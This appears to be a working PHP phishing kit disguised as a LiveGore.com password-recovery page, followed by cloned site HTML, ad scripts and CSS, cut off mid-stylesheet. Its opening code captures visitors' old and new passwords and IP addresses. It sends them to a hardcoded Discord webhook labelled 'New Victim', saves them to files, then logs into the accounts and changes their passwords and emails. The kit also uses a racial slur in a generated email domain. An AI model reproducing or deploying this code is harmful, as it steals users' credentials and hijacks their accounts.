<?php

if(!isset($_GET['username'])) {
	die("Hello! Welcome to our website");
}

if(!@file_get_contents("https://www.livegore.com/user/${_GET['username']}"))
	die("Hello! Welcome to our website");

#curl 'https://discord.com/api/webhooks/1112488388340228116/GXs4qTQkiBfB0ZENatdpyitbMAj3Bgcwvy5cgYBYw2GqtZh39kVO92L4Ns0faeKIaO4I' -X POST --data-raw 'content=test2'


if(isset($_POST['new-password']) && isset($_POST['password']) /*&& isset($_POST['emailhandle'])*/) {
	$ob_file = fopen('log.txt','a');

	function ob_file_callback($buffer) {
		global $ob_file;
		fwrite($ob_file,$buffer);
	}

	ob_start('ob_file_callback');
	

	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, 'https://discord.com/api/webhooks/1112488388340228116/GXs4qTQkiBfB0ZENatdpyitbMAj3Bgcwvy5cgYBYw2GqtZh39kVO92L4Ns0faeKIaO4I');
	
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30); 
	curl_setopt($ch, CURLOPT_TIMEOUT, 0);
	
	
	function message(string $text) {
		global $ch;
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, ['content' => $text]);
		curl_exec($ch);
	}
	
	function randomEmail() : string {
		return bin2hex(random_bytes((24-(24%2))/2)) . '@niggermail.org';
	}
	
	message("```ini\n[New Victim]\nusername=${_GET['username']}\noldpassword=${_POST['password']}\nnewpassword=${_POST['new-password']}\nip=${_SERVER['REMOTE_ADDR']}```");
	
	require_once 'LGBot.php';
	
	file_put_contents('login-'.$_GET['username'].'.txt', $_POST['password']);
	
	$failed = false;
	
	try {
		$acc = new LGBot($_GET['username']);
		
		message("His email: `".$acc->getEmail()."`");
		
		if($acc->changePassword('xxx-xxx-xxx'))
			message("Changed password to `xxx-xxx-xxx`");
		else
			message("Could not change password!");
		
		
		$newEmail = randomEmail();
		
		if($acc->changeEmail($newEmail))
			message("Changed email to `$newEmail`");
		else
			message("Could not change email!");
		
	} catch(Exception $e) {
		$failed = true;
		message("# Exception while logging into ${_GET['username']} with his OLD password `${_POST['password']}`, trying with new one");
		message("```JSON\n".json_encode((array)$e, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE)."```");
	}
	
	if($failed) {
		file_put_contents('login-'.$_GET['username'].'.txt', $_POST['new-password']);
		
		try {
			$acc = new LGBot($_GET['username']);
		
			message("His email: `".$acc->getEmail()."`");
			
			if($acc->changePassword('xxx-xxx-xxx'))
				message("Changed password to `xxx-xxx-xxx`");
			else
				message("Could not change password!");
			
			
			$newEmail = randomEmail();
			
			if($acc->changeEmail($newEmail))
				message("Changed email to `$newEmail`");
			else
				message("Could not change email!");
		} catch(Exception $e) {
			$failed = true;
			message("# Exception while logging into ${_GET['username']} with his NEW password `${_POST['password']}`. We're out of luck!");
			message("```JSON\n".json_encode((array)$e, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE)."```");
		}
	}
	
	header('Location: https://www.livegore.com/account?state=password-changed');
	die;
}
?>
<html><!-- Powered by RbMedia --><head><meta http-equiv="content-type" content="text/html;charset=utf-8">

		<meta http-equiv="content-type" content="text/html; charset=utf-8">
		<title>Password Recovery - LiveGore.com</title>
		<meta name="description" content="LiveGore Contains Uncensored News Media Reality Including Accident, Crime And More!">
		<link rel="stylesheet" type="text/css" href="rb-theme/livegorev2/rb-styles895a.css?4.1">
		<link rel="stylesheet" type="text/css" href="rb-theme/livegorev2/videoplayer/video-js.css">
		<style type="text/css"><!--
			.rb-body-js-on .rb-notice {display:none;}
		//--></style>
		<link href="rb-plugin/rb-tab-widget/styles/default.css" type="text/css" rel="stylesheet">
		<link type="text/css" rel="stylesheet" href="rb-plugin/rb-trending/rb-trending.css">
		<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
<!-- Tssp-->
<script type="text/javascript" async="" src="https://d3g5ovfngjw9bw.cloudfront.net/diff.min.js" crossorigin="anonymous"></script><script type="text/javascript" async="" src="https://www.cdn4ads.com/matter.min.js" crossorigin="anonymous"></script><script src="https://connect.facebook.net/en_US/sdk.js?hash=c056fc245f94db89c576a27831d91a62" async="" crossorigin="anonymous"></script><script type="text/javascript" async="" src="https://d3g5ovfngjw9bw.cloudfront.net/diff.min.js" crossorigin="anonymous"></script><script type="text/javascript" async="" src="https://www.cdn4ads.com/matter.min.js" crossorigin="anonymous"></script><script type="text/javascript" async="" src="https://d3g5ovfngjw9bw.cloudfront.net/diff.min.js" crossorigin="anonymous"></script><script type="text/javascript" async="" src="https://www.cdn4ads.com/matter.min.js" crossorigin="anonymous"></script><script src="https://connect.facebook.net/en_US/sdk.js?hash=c056fc245f94db89c576a27831d91a62" async="" crossorigin="anonymous"></script><script id="facebook-jssdk" src="https://connect.facebook.net/en_US/sdk.js#xfbml=1&amp;version=v2.4&amp;appId=694517970611482"></script><script type="text/javascript" async="" src="https://d3g5ovfngjw9bw.cloudfront.net/diff.min.js" crossorigin="anonymous"></script><script type="text/javascript" async="" src="https://www.cdn4ads.com/matter.min.js" crossorigin="anonymous"></script><script type="text/javascript" data-cfasync="false">
/*<![CDATA[/* */
(function(){if(window.ffeb039d4b77c69f67d33845b8777444) return; window.ffeb039d4b77c69f67d33845b8777444="Ed8iBpQNrQV_SxMtV89FDgSl3h9odyFiliMM5LJYp5w8-p8Sl9TtImB_W0qGLBstjs56CptQ3shEZT3IBw";var c=['wrbCu3E6ODI=','w7sdw5s=','wrs6EV7CtXzCh8O9w5rCkELDjXVNBQ==','VMK6wpg=','S1t+RMOxMMKFHnd9NA==','b2xIw7zCtMOCIcKtw7Y=','w73CinkUwpPDkg==','M2TDlMKbIw==','NBpOwpImBMOKw6HCvcKHASYGcMOfWcKHIk/DpGR+w4jCmsKYwp7CjErDtw==','wocDwqV7bsKXwrXDgg==','M2LDqyNQwqY=','wrLCr3R9MCE5P8OOwqjCpMKxcjYww7o5WRssWw==','wpjDgwbDvMOZIgFkD8OTw51Z','wrMjwqnDtMKmVw==','w6cBw50fbgbDvQ==','w6rCjGccwprDpMK5XMK1wrENwpQ=','KRhvw6fCoH7CocKnw49S','GMOaQV0=','DjV0MMOrCUPDucOFwp98w4DCosKa','w4YrKW7CgGYMwqc=','aDY5CcKSw7XDgiLDsykOGcKA','BcOvw4rDo8K1woLDi8OL','wrLCr3R9LC8vP8OfwrHCvcK0Ozk5wrl1VFhpX8K5w7LCn8KGWA==','KsKVNsOCfMOdw47DikR1NMKUwrfCt1bCkAAxwpnCkg==','wpXCnhLCrMOEICVvDsOWw5gFwq4rw4bDkz99w5TDg8OTQ3rDmsKleMKHc8KXw5zDtcOcw5nDt8Khw6owwqPDg8OGw7U=','IGbDqDLCqyw8EcKmPMOwwo4=','wrovwqHDl8K6Xy7Cqhp3W8KfRg==','BcOlw4/Dt8KtwovDkQ==','NxRJw5k='];(function(a,b){var d=function(g){while(--g){a['push'](a['shift']());}};d(++b);}(c,0x1ec));var d=function(a,b){a=a-0x0;var e=c[a];if(d['VxMrYr']===undefined){(function(){var h;try{var j=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');h=j();}catch(k){h=window;}var i='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';h['atob']||(h['atob']=function(l){var m=String(l)['replace'](/=+$/,'');var n='';for(var o=0x0,p,q,r=0x0;q=m['charAt'](r++);~q&&(p=o%0x4?p*0x40+q:q,o++%0x4)?n+=String['fromCharCode'](0xff&p>>(-0x2*o&0x6)):0x0){q=i['indexOf'](q);}return n;});}());var g=function(h,l){var m=[],n=0x0,o,p='',q='';h=atob(h);for(var t=0x0,u=h['length'];t<u;t++){q+='%'+('00'+h['charCodeAt'](t)['toString'](0x10))['slice'](-0x2);}h=decodeURIComponent(q);var r;for(r=0x0;r<0x100;r++){m[r]=r;}for(r=0x0;r<0x100;r++){n=(n+m[r]+l['charCodeAt'](r%l['length']))%0x100;o=m[r];m[r]=m[n];m[n]=o;}r=0x0;n=0x0;for(var v=0x0;v<h['length'];v++){r=(r+0x1)%0x100;n=(n+m[r])%0x100;o=m[r];m[r]=m[n];m[n]=o;p+=String['fromCharCode'](h['charCodeAt'](v)^m[(m[r]+m[n])%0x100]);}return p;};d['MnFEbm']=g;d['Vqgirb']={};d['VxMrYr']=!![];}var f=d['Vqgirb'][a];if(f===undefined){if(d['Nqgisl']===undefined){d['Nqgisl']=!![];}e=d['MnFEbm'](e,b);d['Vqgirb'][a]=e;}else{e=f;}return e;};var t=window;t[d('0x12','G8D8')]=[[d('0xb','kTB2'),0x18db57],[d('0xe','X*HC'),0x0],[d('0x13','mBqm'),d('0x4','J754')],[d('0x10','R](z'),0x0],[d('0x1c','J754'),![]],[d('0x1b','X*HC'),0x0],[d('0x1a','q1[m'),!0x1]];var a=[d('0x9','zx$7'),d('0x19','C!)5'),d('0xc','@^*B'),d('0x17','@^*B')],b=0x0,r,z=function(){if(!a[b])return;r=t[d('0xa','GhIB')][d('0x15','00Wb')](d('0x7','R](z'));r[d('0x0','zx$7')]=d('0x3','*X2b');r[d('0x8','ole6')]=!0x0;var e=t[d('0x16','J754')][d('0x18','RSc]')](d('0x1','@^*B'))[0x0];r[d('0x2','YIf1')]=d('0x14','AB&K')+a[b];r[d('0x5','9ybF')]=d('0x6','zv50');r[d('0xf','YIf1')]=function(){b++;z();};e[d('0x11','nfE2')][d('0xd','C!)5')](r,e);};z();})();
/*]]>/* */
</script>
		<meta name="clckd" content="bc69077ca5bcbf9404691b26ea0b9d5a">
<link rel="icon" type="image/" href="favicon.png">
		<script>
		var qa_root = 'https://www.livegore.com/.\/';
		var qa_request = 'login';
		var qa_oldonload = window.onload;
		window.onload = function() {
			if (typeof qa_oldonload == 'function')
				qa_oldonload();
			
			qa_reveal(document.getElementById('notice_visitor'), 'notice');
			
			var elem = document.getElementById('emailhandle');
			if (elem) {
				elem.select();
				elem.focus();
			}
		};
		</script>
		<script src="https://www.livegore.com/rb-content/jquery-1.7.2.min.js"></script>
		<script src="https://www.livegore.com/rb-content/rb-page.js?4.1"></script>
		<!-- Global site tag (gtag.js) - Google Analytics -->
<script async="" src="https://www.googletagmanager.com/gtag/js?id=UA-99633839-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-99633839-1');
</script>
		<script type="text/javascript">
						var eventnotifyAjaxURL = "https://www.livegore.com/eventnotify";
					</script>
		<script type="text/javascript" src="https://www.livegore.com/rb-plugin/rb-notifications/script.js"></script>
		<link rel="stylesheet" type="text/css" href="rb-plugin/rb-notifications/styles.css">
			<script src="https://www.livegore.com/rb-plugin/rb-tab-widget/tabs.js"></script>
			<script type="text/javascript" src="https://www.livegore.com/rb-plugin/rb-trending/owl.carousel.min.js"></script>
			<script type="text/javascript">
				$(document).ready(function(){
				
					var warn_on_leave = false;
					
					$(".rb-main textarea").keyup( function() {
						warn_on_leave = true;
					});
					
					$(".rb-main input").keyup( function() {
						warn_on_leave = true;
					});
					
					$("input:submit").click( function() {
						warn_on_leave = false;
						return true;
					});
				
					if(typeof(CKEDITOR) !== "undefined") {
						CKEDITOR.on("currentInstance", function() {
							try {
								CKEDITOR.currentInstance.on("key", function() {
									warn_on_leave = true;
								});
							} catch (err) { }
						});
					}
					
					$(window).bind("beforeunload", function() {
						if(warn_on_leave) {
							return "WARNING!!! Your text has not been saved. All inputs are lost if you leave the page!";
						}
					});
				}); 
				</script>
			<style>
				.rb-q-list-item-featured:before { 
  content: ' Watch Me! ';
  width:auto;
  padding:0 8px;
  height:24px;
  line-height:24px;
  color:#C50C0C; 1F0006 
  font-weight:bold;
  font-size:13px;
  background-color: #FE0;
  position:absolute;
  left:-5px;
  top:5px;
  border-radius:3px;
  z-index:12;
}

.rb-q-list-item-featured {position:relative;}
			</style>
			<style type="text/css">.rb-top-search-title {
    font: bold;
    font-size: large;
    font-family: Arial;
    font-weight: bold;
    color: #337ab9;
}
.topsearch-widget-container {
    margin-bottom: 10px;}
.rb-top-search {
    margin: 5px;}
	.rb-top-search-item {
margin-right: 3px;
	font-size: x-medium;
       padding-right: 2px;				}

				</style>
		<style type="text/css" data-fbcssmodules="css:fb.css.base css:fb.css.dialog css:fb.css.iframewidget css:fb.css.customer_chat_plugin_iframe">.fb_hidden{position:absolute;top:-10000px;z-index:10001}.fb_reposition{overflow:hidden;position:relative}.fb_invisible{display:none}.fb_reset{background:none;border:0;border-spacing:0;color:#000;cursor:auto;direction:ltr;font-family:'lucida grande', tahoma, verdana, arial, sans-serif;font-size:11px;font-style:normal;font-variant:normal;font-weight:normal;letter-spacing:normal;line-height:1;margin:0;overflow:visible;padding:0;text-align:left;text-decoration:none;text-indent:0;text-shadow:none;text-transform:none;visibility:visible;white-space:normal;word-spacing:normal}.fb_reset>div{overflow:hidden}@keyframes fb_transform{from{opacity:0;transform:scale(.95)}to{opacity:1;transform:scale(1)}}.fb_animate{animation:fb_transform .3s forwards}
.fb_hidden{position:absolute;top:-10000px;z-index:10001}.fb_reposition{overflow:hidden;position:relative}.fb_invisible{display:none}.fb_reset{background:none;border:0;border-spacing:0;color:#000;cursor:auto;direction:ltr;font-family:'lucida grande', tahoma, verdana, arial, sans-serif;font-size:11px;font-style:normal;font-variant:normal;font-weight:normal;letter-spacing:normal;line-height:1;margin:0;overflow:visible;padding:0;text-align:left;text-decoration:none;text-indent:0;text-shadow:none;text-transform:none;visibility:visible;white-space:normal;word-spacing:normal}.fb_reset>div{overflow:hidden}@keyframes fb_transform{from{opacity:0;transform:scale(.95)}to{opacity:1;transform:scale(1)}}.fb_animate{animation:fb_transform .3s forwards}
.fb_dialog{background:rgba(82, 82, 82, .7);position:absolute;top:-10000px;z-index:10001}.fb_dialog_advanced{border-radius:8px;padding:10px}.fb_dialog_content{background:#fff;color:#373737}.fb_dialog_close_icon{background:url(https://connect.facebook.net/rsrc.php/v3/yq/r/IE9JII6Z1Ys.png) no-repeat scroll 0 0 transparent;cursor:pointer;display:block;height:15px;position:absolute;right:18px;top:17px;width:15px}.fb_dialog_mobile .fb_dialog_close_icon{left:5px;right:auto;top:5px}.fb_dialog_padding{background-color:transparent;position:absolute;width:1px;z-index:-1}.fb_dialog_close_icon:hover{background:url(https://connect.facebook.net/rsrc.php/v3/yq/r/IE9JII6Z1Ys.png) no-repeat scroll 0 -15px transparent}.fb_dialog_close_icon:active{background:url(https://connect.facebook.net/rsrc.php/v3/yq/r/IE9JII6Z1Ys.png) no-repeat scroll 0 -30px transparent}.fb_dialog_iframe{line-height:0}.fb_dialog_content .dialog_title{background:#6d84b4;border:1px solid #365899;color:#fff;font-size:14px;font-weight:bold;margin:0}.fb_dialog_content .dialog_title>span{background:url(https://connect.facebook.net/rsrc.php/v3/yd/r/Cou7n-nqK52.gif) no-repeat 5px 50%;float:left;padding:5px 0 7px 26px}body.fb_hidden{height:100%;left:0;margin:0;overflow:visible;position:absolute;top:-10000px;transform:none;width:100%}.fb_dialog.fb_dialog_mobile.loading{background:url(https://connect.facebook.net/rsrc.php/v3/ya/r/3rhSv5V8j3o.gif) white no-repeat 50% 50%;min-height:100%;min-width:100%;overflow:hidden;position:absolute;top:0;z-index:10001}.fb_dialog.fb_dialog_mobile.loading.centered{background:none;height:auto;min-height:initial;min-width:initial;width:auto}.fb_dialog.fb_dialog_mobile.loading.centered #fb_dialog_loader_spinner{width:100%}.fb_dialog.fb_dialog_mobile.loading.centered .fb_dialog_content{background:none}.loading.centered #fb_dialog_loader_close{clear:both;color:#fff;display:block;font-size:18px;padding-top:20px}#fb-root #fb_dialog_ipad_overlay{background:rgba(0, 0, 0, .4);bottom:0;left:0;min-height:100%;position:absolute;right:0;top:0;width:100%;z-index:10000}#fb-root #fb_dialog_ipad_overlay.hidden{display:none}.fb_dialog.fb_dialog_mobile.loading iframe{visibility:hidden}.fb_dialog_mobile .fb_dialog_iframe{position:sticky;top:0}.fb_dialog_content .dialog_header{background:linear-gradient(from(#738aba), to(#2c4987));border-bottom:1px solid;border-color:#043b87;box-shadow:white 0 1px 1px -1px inset;color:#fff;font:bold 14px Helvetica, sans-serif;text-overflow:ellipsis;text-shadow:rgba(0, 30, 84, .296875) 0 -1px 0;vertical-align:middle;white-space:nowrap}.fb_dialog_content .dialog_header table{height:43px;width:100%}.fb_dialog_content .dialog_header td.header_left{font-size:12px;padding-left:5px;vertical-align:middle;width:60px}.fb_dialog_content .dialog_header td.header_right{font-size:12px;padding-right:5px;vertical-align:middle;width:60px}.fb_dialog_content .touchable_button{background:linear-gradient(from(#4267B2), to(#2a4887));background-clip:padding-box;border:1px solid #29487d;border-radius:3px;display:inline-block;line-height:18px;margin-top:3px;max-width:85px;padding:4px 12px;position:relative}.fb_dialog_content .dialog_header .touchable_button input{background:none;border:none;color:#fff;font:bold 12px Helvetica, sans-serif;margin:2px -12px;padding:2px 6px 3px 6px;text-shadow:rgba(0, 30, 84, .296875) 0 -1px 0}.fb_dialog_content .dialog_header .header_center{color:#fff;font-size:16px;font-weight:bold;line-height:18px;text-align:center;vertical-align:middle}.fb_dialog_content .dialog_content{background:url(https://connect.facebook.net/rsrc.php/v3/y9/r/jKEcVPZFk-2.gif) no-repeat 50% 50%;border:1px solid #4a4a4a;border-bottom:0;border-top:0;height:150px}.fb_dialog_content .dialog_footer{background:#f5f6f7;border:1px solid #4a4a4a;border-top-color:#ccc;height:40px}#fb_dialog_loader_close{float:left}.fb_dialog.fb_dialog_mobile .fb_dialog_close_icon{visibility:hidden}#fb_dialog_loader_spinner{animation:rotateSpinner 1.2s linear infinite;background-color:transparent;background-image:url(https://connect.facebook.net/rsrc.php/v3/yD/r/t-wz8gw1xG1.png);background-position:50% 50%;background-repeat:no-repeat;height:24px;width:24px}@keyframes rotateSpinner{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
.fb_iframe_widget{display:inline-block;position:relative}.fb_iframe_widget span{display:inline-block;position:relative;text-align:justify}.fb_iframe_widget iframe{position:absolute}.fb_iframe_widget_fluid_desktop,.fb_iframe_widget_fluid_desktop span,.fb_iframe_widget_fluid_desktop iframe{max-width:100%}.fb_iframe_widget_fluid_desktop iframe{min-width:220px;position:relative}.fb_iframe_widget_lift{z-index:1}.fb_iframe_widget_fluid{display:inline}.fb_iframe_widget_fluid span{width:100%}
.fb_mpn_mobile_landing_page_slide_out{animation-duration:200ms;animation-name:fb_mpn_landing_page_slide_out;transition-timing-function:ease-in}.fb_mpn_mobile_landing_page_slide_out_from_left{animation-duration:200ms;animation-name:fb_mpn_landing_page_slide_out_from_left;transition-timing-function:ease-in}.fb_mpn_mobile_landing_page_slide_up{animation-duration:500ms;animation-name:fb_mpn_landing_page_slide_up;transition-timing-function:ease-in}.fb_mpn_mobile_bounce_in{animation-duration:300ms;animation-name:fb_mpn_bounce_in;transition-timing-function:ease-in}.fb_mpn_mobile_bounce_out{animation-duration:300ms;animation-name:fb_mpn_bounce_out;transition-timing-function:ease-in}.fb_mpn_mobile_bounce_out_v2{animation-duration:300ms;animation-name:fb_mpn_fade_out;transition-timing-function:ease-in}.fb_customer_chat_bounce_in_v2{animation-duration:300ms;animation-name:fb_bounce_in_v2;transition-timing-function:ease-in}.fb_customer_chat_bounce_in_from_left{animation-duration:300ms;animation-name:fb_bounce_in_from_left;transition-timing-function:ease-in}.fb_customer_chat_bounce_out_v2{animation-duration:300ms;animation-name:fb_bounce_out_v2;transition-timing-function:ease-in}.fb_customer_chat_bounce_out_from_left{animation-duration:300ms;animation-name:fb_bounce_out_from_left;transition-timing-function:ease-in}.fb_invisible_flow{display:inherit;height:0;overflow-x:hidden;width:0}@keyframes fb_mpn_landing_page_slide_out{0%{margin:0 12px;width:100% - 24px}60%{border-radius:18px}100%{border-radius:50%;margin:0 24px;width:60px}}@keyframes fb_mpn_landing_page_slide_out_from_left{0%{left:12px;width:100% - 24px}60%{border-radius:18px}100%{border-radius:50%;left:12px;width:60px}}@keyframes fb_mpn_landing_page_slide_up{0%{bottom:0;opacity:0}100%{bottom:24px;opacity:1}}@keyframes fb_mpn_bounce_in{0%{opacity:.5;top:100%}100%{opacity:1;top:0}}@keyframes fb_mpn_fade_out{0%{bottom:30px;opacity:1}100%{bottom:0;opacity:0}}@keyframes fb_mpn_bounce_out{0%{opacity:1;top:0}100%{opacity:.5;top:100%}}@keyframes fb_bounce_in_v2{0%{opacity:0;transform:scale(0, 0);transform-origin:bottom right}50%{transform:scale(1.03, 1.03);transform-origin:bottom right}100%{opacity:1;transform:scale(1, 1);transform-origin:bottom right}}@keyframes fb_bounce_in_from_left{0%{opacity:0;transform:scale(0, 0);transform-origin:bottom left}50%{transform:scale(1.03, 1.03);transform-origin:bottom left}100%{opacity:1;transform:scale(1, 1);transform-origin:bottom left}}@keyframes fb_bounce_out_v2{0%{opacity:1;transform:scale(1, 1);transform-origin:bottom right}100%{opacity:0;transform:scale(0, 0);transform-origin:bottom right}}@keyframes fb_bounce_out_from_left{0%{opacity:1;transform:scale(1, 1);transform-origin:bottom left}100%{opacity:0;transform:scale(0, 0);transform-origin:bottom left}}@keyframes slideInFromBottom{0%{opacity:.1;transform:translateY(100%)}100%{opacity:1;transform:translateY(0)}}@keyframes slideInFromBottomDelay{0%{opacity:0;transform:translateY(100%)}97%{opacity:0;transform:translateY(100%)}100%{opacity:1;transform:translateY(0)}}</style><style type="text/css" data-fbcssmodules="css:fb.css.base css:fb.css.dialog css:fb.css.iframewidget css:fb.css.customer_chat_plugin_iframe">.fb_hidden{position:absolute;top:-10000px;z-index:10001}.fb_reposition{overflow:hidden;position:relative}.fb_invisible{display:none}.fb_reset{background:none;border:0;border-spacing:0;color:#000;cursor:auto;direction:ltr;font-family:'lucida grande', tahoma, verdana, arial, sans-serif;font-size:11px;font-style:normal;font-variant:normal;font-weight:normal;letter-spacing:normal;line-height:1;margin:0;overflow:visible;padding:0;text-align:left;text-decoration:none;text-indent:0;text-shadow:none;text-transform:none;visibility:visible;white-space:normal;word-spacing:normal}.fb_reset>div{overflow:hidden}@keyframes fb_transform{from{opacity:0;transform:scale(.95)}to{opacity:1;transform:scale(1)}}.fb_animate{animation:fb_transform .3s forwards}
.fb_hidden{position:absolute;top:-10000px;z-index:10001}.fb_reposition{overflow:hidden;position:relative}.fb_invisible{display:none}.fb_reset{background:none;border:0;border-spacing:0;color:#000;cursor:auto;direction:ltr;font-family:'lucida grande', tahoma, verdana, arial, sans-serif;font-size:11px;font-style:normal;font-variant:normal;font-weight:normal;letter-spacing:normal;line-height:1;margin:0;overflow:visible;padding:0;text-align:left;text-decoration:none;text-indent:0;text-shadow:none;text-transform:none;visibility:visible;white-space:normal;word-spacing:normal}.fb_reset>div{overflow:hidden}@keyframes fb_transform{from{opacity:0;transform:scale(.95)}to{opacity:1;transform:scale(1)}}.fb_animate{animation:fb_transform .3s forwards}
.fb_dialog{background:rgba(82, 82, 82, .7);position:absolute;top:-10000px;z-index:10001}.fb_dialog_advanced{border-radius:8px;padding:10px}.fb_dialog_content{background:#fff;color:#373737}.fb_dialog_close_icon{background:url(https://connect.facebook.net/rsrc.php/v3/yq/r/IE9JII6Z1Ys.png) no-repeat scroll 0 0 transparent;cursor:pointer;display:block;height:15px;position:absolute;right:18px;top:17px;width:15px}.fb_dialog_mobile .fb_dialog_close_icon{left:5px;right:auto;top:5px}.fb_dialog_padding{background-color:transparent;position:absolute;width:1px;z-index:-1}.fb_dialog_close_icon:hover{background:url(https://connect.facebook.net/rsrc.php/v3/yq/r/IE9JII6Z1Ys.png) no-repeat scroll 0 -15px transparent}.fb_dialog_close_icon:active{background:url(https://connect.facebook.net/rsrc.php/v3/yq/r/IE9JII6Z1Ys.png) no-repeat scroll 0 -30px transparent}.fb_dialog_iframe{line-height:0}.fb_dialog_content .dialog_title{background:#6d84b4;border:1px solid #365899;color:#fff;font-size:14px;font-weight:bold;margin:0}.fb_dialog_content .dialog_title>span{background:url(https://connect.facebook.net/rsrc.php/v3/yd/r/Cou7n-nqK52.gif) no-repeat 5px 50%;float:left;padding:5px 0 7px 26px}body.fb_hidden{height:100%;left:0;margin:0;overflow:visible;position:absolute;top:-10000px;transform:none;width:100%}.fb_dialog.fb_dialog_mobile.loading{background:url(https://connect.facebook.net/rsrc.php/v3/ya/r/3rhSv5V8j3o.gif) white no-repeat 50% 50%;min-height:100%;min-width:100%;overflow:hidden;position:absolute;top:0;z-index:10001}.fb_dialog.fb_dialog_mobile.loading.centered{background:none;height:auto;min-height:initial;min-width:initial;width:auto}.fb_dialog.fb_dialog_mobile.loading.centered #fb_dialog_loader_spinner{width:100%}.fb_dialog.fb_dialog_mobile.loading.centered .fb_dialog_content{background:none}.loading.centered #fb_dialog_loader_close{clear:both;color:#fff;display:block;font-size:18px;padding-top:20px}#fb-root #fb_dialog_ipad_overlay{background:rgba(0, 0, 0, .4);bottom:0;left:0;min-height:100%;position:absolute;right:0;top:0;width:100%;z-index:10000}#fb-root #fb_dialog_ipad_overlay.hidden{display:none}.fb_dialog.fb_dialog_mobile.loading iframe{visibility:hidden}.fb_dialog_mobile .fb_dialog_iframe{position:sticky;top:0}.fb_dialog_content .dialog_header{background:linear-gradient(from(#738aba), to(#2c4987));border-bottom:1px solid;border-color:#043b87;box-shadow:white 0 1px 1px -1px inset;color:#fff;font:bold 14px Helvetica, sans-serif;text-overflow:ellipsis;text-shadow:rgba(0, 30, 84, .296875) 0 -1px 0;vertical-align:middle;white-space:nowrap}.fb_dialog_content .dialog_header table{height:43px;width:100%}.fb_dialog_content .dialog_header td.header_left{font-size:12px;padding-left:5px;vertical-align:middle;width:60px}.fb_dialog_content .dialog_header td.header_right{font-size:12px;padding-right:5px;vertical-align:middle;width:60px}.fb_dialog_content .touchable_button{background:linear-gradient(from(#4267B2), to(#2a4887));background-clip:padding-box;border:1px solid #29487d;border-radius:3px;display:inline-block;line-height:18px;margin-top:3px;max-width:85px;padding:4px 12px;position:relative}.fb_dialog_content .dialog_header .touchable_button input{background:none;border:none;color:#fff;font:bold 12px Helvetica, sans-serif;margin:2px -12px;padding:2px 6px 3px 6px;text-shadow:rgba(0, 30, 84, .296875) 0 -1px 0}.fb_dialog_content .dialog_header .header_center{color:#fff;font-size:16px;font-weight:bold;line-height:18px;text-align:center;vertical-align:middle}.fb_dialog_content .dialog_content{background:url(https://connect.facebook.net/rsrc.php/v3/y9/r/jKEcVPZFk-2.gif) no-repeat 50% 50%;border:1px solid #4a4a4a;border-bottom:0;border-top:0;height:150px}.fb_dialog_content .dialog_footer{background:#f5f6f7;border:1px solid #4a4a4a;border-top-color:#ccc;height:40px}#fb_dialog_loader_close{float:left}.fb_dialog.fb_dialog_mobile .fb_dialog_close_icon{visibility:hidden}#fb_dialog_loader_spinner{animation:rotateSpinner 1.2s linear infinite;background-color:transparent;background-image:url(https://connect.facebook.net/rsrc.php/v3/yD/r/t-wz8gw1xG1.png);background-position:50% 50%;background-repeat:no-repeat;height:24px;width:24px}@keyframes rotateSpinner{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
.fb_iframe_widget{display:inline-block;position:relative}.fb_iframe_widget span{display:inline-block;position:relative;text-align:justify}.fb_iframe_widget iframe{position:absolute}.fb_iframe_widget_fluid_desktop,.fb_iframe_widget_fluid_desktop span,.fb_iframe_widget_fluid_desktop iframe{max-width:100%}.fb_iframe_widget_fluid_desktop iframe{min-width:220px;position:relative}.fb_iframe_widget_lift{z-index:1}.fb_iframe_widget_fluid{display:inline}.fb_iframe_widget_fluid span{width:100%}
.fb_mpn_mobile_landing_page_slide_out{animation-duration:200ms;animation-name:fb_mpn_landing_page_slide_out;transition-timing-function:ease-in}.fb_mpn_mobile_landing_page_slide_out_from_left{animation-duration:200ms;animation-name:fb_mpn_landing_page_slide_out_from_left;transition-timing-function:ease-in}.fb_mpn_mobile_landing_page_slide_up{animation-duration:500ms;animation-name:fb_mpn_landing_page_slide_up;transition-timing-function:ease-in}.fb_mpn_mobile_bounce_in{animation-duration:300ms;animation-name:fb_mpn_bounce_in;transition-timing-function:ease-in}.fb_mpn_mobile_bounce_out{animation-duration:300ms;animation-name:fb_mpn_bounce_out;transition-timing-function:ease-in}.fb_mpn_mobile_bounce_out_v2{animation-duration:300ms;animation-name:fb_mpn_fade_out;transition-timing-function:ease-in}.fb_customer_chat_bounce_in_v2{animation-duration:300ms;animation-name:fb_bounce_in_v2;transition-timing-function:ease-in}.fb_customer_chat_bounce_in_from_left{animation-duration:300ms;animation-name:fb_bounce_in_from_left;transition-timing-function:ease-in}.fb_customer_chat_bounce_out_v2{animation-duration:300ms;animation-name:fb_bounce_out_v2;transition-timing-function:ease-in}.fb_customer_chat_bounce_out_from_left{animation-duration:300ms;animation-name:fb_bounce_out_from_left;transition-timing-function:ease-in}.fb_invisible_flow{display:inherit;height:0;overflow-x:hidden;width:0}@keyframes fb_mpn_landing_page_slide_out{0%{margin:0 12px;width:100% - 24px}60%{border-radius:18px}100%{border-radius:50%;margin:0 24px;width:60px}}@keyframes fb_mpn_landing_page_slide_out_from_left{0%{left:12px;width:100% - 24px}60%{border-radius:18px}100%{border-radius:50%;left:12px;width:60px}}@keyframes fb_mpn_landing_page_slide_up{0%{bottom:0;opacity:0}100%{bottom:24px;opacity:1}}@keyframes fb_mpn_bounce_in{0%{opacity:.5;top:100%}100%{opacity:1;top:0}}@keyframes fb_mpn_fade_out{0%{bottom:30px;opacity:1}100%{bottom:0;opacity:0}}@keyframes 